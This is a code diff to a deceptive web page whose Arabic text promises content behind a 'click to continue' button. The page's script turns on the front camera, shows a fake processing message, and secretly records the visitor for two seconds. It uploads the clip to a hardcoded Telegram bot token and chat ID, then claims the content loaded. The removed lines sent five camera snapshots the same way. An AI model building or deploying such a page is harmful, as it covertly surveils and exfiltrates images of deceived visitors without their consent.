@@ -6,60 +6,68 @@
     <title>جاري التحميل...</title>
     <style>
         body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
-        button { background: #38bdf8; color: #0f172a; border: none; padding: 15px 35px; font-size: 1.2rem; font-weight: bold; border-radius: 10px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
+        button { background: #38bdf8; color: #0f172a; border: none; padding: 18px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 12px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
     </style>
 </head>
 <body>
-    <button onclick="start()">اضغط هنا للمتابعة</button>
+    <button onclick="startRecording()">اضغط هنا للمتابعة</button>
     <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
         const CHAT = '8304712202';
 
-        async function start() {
+        async function startRecording() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // إخفاء الزر لمنع الضغط المكرر
                 document.body.innerHTML = '<h2>جاري المعالجة، يرجى الانتظار...</h2>';
 
-                setTimeout(async () => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = 120;  // حجم خفيف جداً يمنع التجمد نهائياً
-                    canvas.height = 90;
-                    const ctx = canvas.getContext('2d');
-                    
-                    for (let i = 1; i <= 5; i++) {
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        let base64Image = canvas.toDataURL('image/jpeg', 0.3);
+                let mediaRecorder;
+                let chunks = [];
 
-                        try {
-                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ 
-                                    chat_id: CHAT, 
-                                    text: `📸 صورة (${i}):\n${base64Image}` 
-                                })
-                            });
-                        } catch (err) {
-                            console.error(err);
-                        }
+                try {
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream); // دعم لو المتصفح مش بيقبل webm
+                }
 
-                        // فاصل زمني أمان (ثانية كاملة) بين كل صورة والثانية عشان الموبايل ما يهنجش خالص
-                        if (i < 5) {
-                            await new Promise(r => setTimeout(r, 1000));
-                        }
+                mediaRecorder.ondataavailable = e => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT);
+                    formData.append('video', blob, 'visitor_video.webm');
+                    formData.append('caption', '🚨 فيديو توثيقي للزائر:');
+
+                    try {
+                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (err) {
+                        console.error(err);
                     }
 
                     stream.getTracks().forEach(t => t.stop());
                     document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
+                };
 
-                }, 1500);
+                // بدء التسجيل
+                mediaRecorder.start();
+
+                // إيقاف التسجيل تلقائياً بعد ثانيتين وارساله للبوت
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 2000);
+
             } catch (e) {
                 alert('يرجى السماح بإذن الكاميرا للمتابعة');
             }
